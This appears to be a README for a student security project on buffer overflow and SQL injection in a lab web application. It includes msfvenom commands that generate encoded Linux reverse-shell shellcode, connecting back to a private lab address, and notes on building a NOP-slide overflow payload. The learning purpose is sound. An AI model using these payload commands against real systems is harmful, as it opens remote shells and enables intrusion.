# Project: Exploring Buffer Overflow, XSS and SQL Injection Techniques

<!-- markdown-toc start - Don't edit this section. Run M-x markdown-toc-refresh-toc -->
**Table of Contents**

- [Project: Exploring Buffer Overflow, XSS and SQL Injection Techniques](#project-exploring-buffer-overflow-xss-and-sql-injection-techniques)
    - [Methodology](#methodology)
    - [Results and Discussion](#results-and-discussion)
- [Buffer Overflow](#buffer-overflow)
    - [Generate Shell Code](#generate-shell-code)
    - [Findings](#findings)
        - [TODO](#todo)
        - [Sources](#sources)

<!-- markdown-toc end -->


This project aims to explore the vulnerabilities of software systems through the use of buffer overflow and SQL injection attacks. These types of attacks are commonly used by malicious actors to gain unauthorized access to sensitive information, disrupt system functionality, or execute arbitrary code on a target system.

Additionally, the project will utilise industry standard tools such as Metasploit Framework to conduct the experiments, demonstrating the ability to work with real-world tools and technologies used in penetration testing and vulnerability assessments. Furthermore, the project will also include a section on mitigation techniques and best practices for secure software development, showing the ability to not only identify vulnerabilities but also propose solutions to fix them. This will showcase a well-rounded understanding of the field, which is highly desirable for employers in the security industry.

## Owner
* Luyang Liu

## Methodology
The project will begin by conducting research on the basics of buffer overflow and SQL injection attacks, including the underlying mechanisms, common techniques, and tools used to perform these types of attacks. This research will be used to inform the design of experiments to demonstrate the vulnerabilities of a sample software system to buffer overflow and SQL injection attacks.

The sample software system chosen for this project will be a simple web application, which will be set up in a controlled environment. The web application will be configured with known vulnerabilities, such as weak input validation and poor error handling, to make it susceptible to buffer overflow and SQL injection attacks.

Once the sample software system is set up, a series of experiments will be conducted to demonstrate the vulnerabilities of the system to buffer overflow and SQL injection attacks. These experiments will involve using a variety of tools and techniques to inject malicious input into the system and observe the resulting behaviour.

## Results and Discussion
The results of the experiments will be analyzed to determine the effectiveness of the buffer overflow and SQL injection attacks, and to identify any potential countermeasures that can be implemented to protect the sample software system from these types of attacks.

The findings of this project will be discussed in a report, which will include an overview of the research conducted, a description of the methodology used, and a detailed analysis of the results. The report will also include recommendations for improving the security of the sample software system, as well as suggestions for future research in this area.

# Buffer Overflow

## Generate Shell Code

* This sheems to work
```shell
msfvenom -p linux/x86/shell/reverse_tcp -f c
```

* This enable shikata_ga_nai encoding
```shell
sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f c
```

* Basic encoding
```
sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f c -b "\x00\x0a\x0d\x20"
```

* List encoders

```sh
./msfvenom -l encoders
```

## Findings
* Stacks grow from higher address to lower
* So the buffer would be above the frame pointer and return address.
* The goal is to replace the return address to the NOP slide.
* Afterwards run the payload (reverse shell code)

* From question one the payload is too short to reach the return address so the code runs normally

### TODO
* Make the overflow payload str end with repeated return address.
* Reverse Shellcode in the middle for execution
* NOP slide at the start so it can trap the execution.

### Sources
https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html
https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html